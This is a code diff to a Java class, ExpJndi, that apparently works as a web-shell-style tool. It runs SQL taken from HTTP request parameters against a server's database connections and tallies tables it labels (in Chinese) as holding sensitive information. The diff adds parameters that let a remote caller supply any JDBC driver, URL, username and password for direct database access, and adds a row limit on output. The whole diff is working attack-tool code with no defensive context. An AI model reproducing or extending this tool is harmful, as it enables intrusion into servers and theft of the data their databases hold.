@@ -4,6 +4,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.sql.Connection;
+import java.sql.DriverManager;
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
 import java.sql.ResultSetMetaData;
@@ -104,6 +105,8 @@ public class ExpJndi {
 						lm.add(mT);
 					}
 					print("\n");
+					if(0 >= nBreak--)
+						break;
 				}
 				out.flush();
 			}
@@ -234,12 +237,12 @@ public class ExpJndi {
 								szFstTb = szLstColsNames;
 //								print((szFstTb = szLstColsNames) + "\n");
 							}
-							szMgb += szFstTbn + "(" + mT.get("NUM_ROWS") + ");  ";
+							szMgb += mT.get("OWNER") + "." + mT.get("TABLE_NAME") + "(" + mT.get("NUM_ROWS") + ");  ";
 						}
 					}
 				}
 			}
-			print("\n累计：" + nCnt);
+			print("\n敏感信息累计：" + nCnt);
 			print("\n敏感信息表分布：" + szMgb + "\n");
 			String szSql1 = "";
 //			if(0 < szFstTbn.length())
@@ -260,9 +263,20 @@ public class ExpJndi {
 //			}
 		}
 	}
-
+	private int nBreak = Integer.MAX_VALUE;
+	private String jdbc_drv = null;
+	private String jdbc_url = null;
+	private String jdbc_u = null;
+	private String jdbc_p = null;
 	public void c() throws Exception {
 		String sql = request.getParameter("s"), jds = request.getParameter("j"), c1 = request.getParameter("col");
+		jdbc_drv = request.getParameter("jdbc_drv");
+		if(null == jdbc_drv)jdbc_drv = "oracle.jdbc.OracleDriver";
+		jdbc_url = request.getParameter("jdbc_url");
+		jdbc_u = request.getParameter("jdbc_u");
+		jdbc_p = request.getParameter("jdbc_p");
+		if(null != request.getParameter("nBreak"))
+			nBreak = Integer.parseInt(request.getParameter("nBreak"));
 		if (null == jds) {
 			jds = getJndiName();
 			if (null == jds) {
@@ -401,7 +415,15 @@ public class ExpJndi {
 				log(e);
 			}
 		if (null == connection) {
-			print("[" + s + "]");
+			if(null != jdbc_url && null != jdbc_u && null != jdbc_p)
+			try {
+				if(null != jdbc_drv)
+					Class.forName(jdbc_drv);
+				connection = DriverManager.getConnection(jdbc_url,jdbc_u,jdbc_p);
+			} catch (Exception e) {
+				log(e);
+			}
+			if (null == connection) print("[" + s + "]");
 		}
 		return connection;
 	}
